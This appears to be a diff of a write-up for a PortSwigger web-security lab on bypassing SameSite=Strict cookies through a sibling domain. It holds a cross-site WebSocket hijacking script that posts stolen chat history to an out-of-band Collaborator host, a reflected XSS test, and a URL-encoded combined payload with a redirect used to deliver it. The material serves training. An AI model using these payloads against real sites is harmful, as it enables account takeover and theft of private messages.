@@ -1,7 +1,6 @@
 SameSite Strict Bypass via Sibling Domain
 
-**Lab URL**: (https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain)
-**Category**: WebSockets > CSWSH  
+**Category**: CSRF > WebSockets > CSWSH  
 **Difficulty**: Practitioner  
 
 ---
@@ -17,59 +16,62 @@ SameSite Strict Bypass via Sibling Domain
 
 ## Exploit Steps / Attack Methodology
 
-###  1. Analyze WebSocket Behavior (
+
+###  1. Analyze WebSocket Behavior
 - Navigated to `/chat` and observed messages being sent via WebSocket.
-- In Burp → **WebSockets history**, noticed the `READY` message triggers the chat history in response.
+- In Burp  **WebSockets history**, noticed the `READY` message triggers the chat history in response.
 - No CSRF token or authentication header in the WebSocket request — potentially CSWSH-vulnerable.
+
 
 ###  2. CSWSH PoC (Reference: Lab Instructions Step 3)
 Tested this payload using the **exploit server** to confirm vulnerability:
 
 ```html
 <script>
-    var ws = new WebSocket('wss://<LAB-ID>.web-security-academy.net/chat');
+    var ws = new WebSocket('wss://LabId.web-security-academy.net/chat');
     ws.onopen = function() {
         ws.send("READY");
     };
     ws.onmessage = function(event) {
-        fetch('https://<COLLAB-PAYLOAD>.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
+        fetch('https://collabid.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
     };
 </script>
- Result: It worked, but only returned chat history for a new session — no session cookies sent due to SameSite=Strict.
+Result: It worked, but only returned chat history for a new session — no session cookies sent due to SameSite=Strict.
 
-🔑 Q&A Flashcards
-(Reference: Lab Instructions Step 1)
-Q: What is the significance of the WebSocket handshake in this lab?
-A: The WebSocket handshake reveals the lack of CSRF protection or unpredictable tokens, which makes it vulnerable to cross-site WebSocket hijacking (CSWSH).
 
-(Reference: Lab Instructions Step 2)
-Q: How can you confirm the CSWSH vulnerability in the lab environment?
-A: By sending a READY message to the WebSocket server after capturing it with Burp, you can confirm the vulnerability when the server responds with the entire chat history, which does not require authentication tokens.
+### Step 4: Identify why session cookie isn’t sent
+In HTTP history, inspect the /chat WebSocket request made by your PoC.
+Notice: No session cookie is sent.
+Check response headers when logging in:
+You’ll see Set-Cookie: ...; SameSite=Strict
+This blocks cookies from cross-site requests (your exploit is cross-site).
 
-(Reference: Lab Instructions Step 3)
-Q: What role does Burp Collaborator play in this lab's exploit process?
-A: Burp Collaborator is used to receive exfiltrated data. After sending a READY message through WebSocket, the chat history is forwarded to a Collaborator payload for extraction.
 
-(Reference: Lab Instructions Step 4)
-Q: Why are session cookies not sent during the WebSocket handshake in the initial attack?
-A: The SameSite cookie policy is set to Strict, preventing the browser from sending session cookies in cross-site requests, which stops the initial CSWSH attack from accessing the victim's chat history.
+### Step 5: Discover a vulnerable sibling domain
+Look through HTTP history. Check headers like Access-Control-Allow-Origin.
+Find something like: cms-labId.web-security-academy.net
+Visit https://cms-labId.web-security-academy.net
+You’ll see a login form.
 
-(Reference: Lab Instructions Step 5)
-Q: How did you identify the sibling domain in this lab?
-A: By analyzing the HTTP response headers, the Access-Control-Allow-Origin header revealed a sibling domain, allowing us to exploit reflected XSS.
 
-(Reference: Lab Instructions Step 6)
-Q: How can reflected XSS on a sibling domain be used to bypass SameSite cookie restrictions?
-A: Since sibling domains are considered part of the same site, the XSS on the sibling domain allows the attack to bypass SameSite restrictions, letting the WebSocket request include session cookies.
+### Step 6: Find an XSS on sibling domain
+Submit:
+username: <script>alert(1)</script>
+password: anything
+You’ll see an alert  confirmed Reflected XSS.
+Send the POST /login request to Repeater.
+Change request method to GET.
+Copy the URL and test it in the browser — the XSS still works.
 
-(Reference: Lab Instructions Step 7)
-Q: What steps are necessary to bypass SameSite=Strict using the sibling domain's reflected XSS?
-A: Inject a URL-encoded CSWSH payload via the username parameter on the sibling domain's login form. Once this is processed, it will trigger the WebSocket request that includes the session cookie.
 
-(Reference: Lab Instructions Step 8)
-Q: Why is URL encoding important in this lab's exploit?
-A: URL encoding ensures that the CSWSH payload is properly transmitted as part of the URL parameter, preventing the browser from interpreting the script before it's executed on the victim's browser.
+### Step 7: Combine XSS and CSWSH payload
+Take the working CSWSH script from earlier.
+URL-encode it using URL encoder or Burp’s encoder:
+%3Cscript%3Evar%20ws%3Dnew%20WebSocket%28%27wss%3A%2F%2F0a6900c4043b65cb80ee0d4000480072.web-security-academy.net%2Fchat%27%29%3Bws.onopen%3Dfunction%28%29%7Bws.send%28%22READY%22%29%3B%7D%3Bws.onmessage%3Dfunction%28event%29%7Bfetch%28%27https%3A%2F%2Fi8rmtdsdjp5zlivzfap3n3qnsey5mvak.oastify.com%27%2C%7Bmethod%3A%27POST%27%2Cmode%3A%27no-cors%27%2Cbody%3Aevent.data%7D%29%3B%7D%3B%3C%2Fscript%3E
+Go back to the Exploit Server and paste this payload:
 
-(Reference: Lab Instructions Final Steps)
-Q: How did you confirm that the exploit was successful and the victim's chat history was exfiltrated?
-A: By monitoring the Burp Collaborator for new interactions, I received the victim's chat history, including their credentials, which confirmed the success of the attack.
+<script>
+    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=PASTE_IT_HERE&password=anything";
+</script>
+Store and View exploit.
+
